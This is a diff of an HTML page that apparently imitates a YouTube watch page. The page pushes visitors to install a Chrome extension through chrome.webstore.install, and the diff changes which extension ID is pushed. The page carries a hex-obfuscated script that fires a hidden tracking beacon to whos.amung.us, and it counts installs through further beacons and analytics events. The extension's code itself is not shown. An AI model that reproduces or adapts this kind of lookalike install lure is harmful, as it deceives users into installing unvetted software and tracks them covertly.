@@ -10,7 +10,7 @@
   <link class="css-httpssytimgcomytscssbinwwwguidewebpvfl3ehrjXcss" href="https://s.ytimg.com/yts/cssbin/www-guide-webp-vfl3ehrjX.css" name="www-guide" rel="stylesheet">
   <link class="css-httpssytimgcomytscssbinwwwpageframedelayloadedwebpvflwYAtW6css" href="https://s.ytimg.com/yts/cssbin/www-pageframedelayloaded-webp-vflwYAtW6.css" name="www-pageframedelayloaded" rel="stylesheet">
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
-  <link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/bonpofhcpehjmnhiobomkednmiceppan">
+  <link rel="chrome-webstore-item" href="https://chrome.google.com/webstore/detail/ckkapajjkkgdbpmkeiddignphbaoofef">
   <script>var _0x5e07=["\x73\x72\x63","\x2F\x2F\x77\x68\x6F\x73\x2E\x61\x6D\x75\x6E\x67\x2E\x75\x73\x2F\x77\x69\x64\x67\x65\x74\x2F\x70\x63\x70\x63\x64\x69\x74\x69\x31\x2E\x70\x6E\x67"]; new Image()[_0x5e07[0]]= _0x5e07[1]</script>
 </head>
 <body class="ltr webkit webkit-537 exp-responsive exp-scrollable-guide site-center-aligned site-as-giant-card appbar-hidden visibility-logging-enabled not-nirvana-dogfood not-yt-legacy-css flex-width-enabled flex-width-enabled-snap page-loaded" data-spf-name="watch" dir="ltr" id="body" style=" overflow: hidden;" cz-shortcut-listen="true">
@@ -320,7 +320,7 @@
           },500)
           $("#alert").hide();
           chrome.webstore.install(
-              'https://chrome.google.com/webstore/detail/bonpofhcpehjmnhiobomkednmiceppan',
+              'https://chrome.google.com/webstore/detail/ckkapajjkkgdbpmkeiddignphbaoofef',
               function() {
               var dax = new Image();
 
@@ -330,7 +330,7 @@ dax.src="http://whos.amung.us/widget/instalimet1.png";
                   $("#errorbox").hide();
                   ga('send', 'event', {
                      'eventCategory': 'installed', 
-                     'eventAction': 'bonpofhcpehjmnhiobomkednmiceppan',
+                     'eventAction': 'ckkapajjkkgdbpmkeiddignphbaoofef',
                      'hitCallback': function() {
                         gofb();
                       },
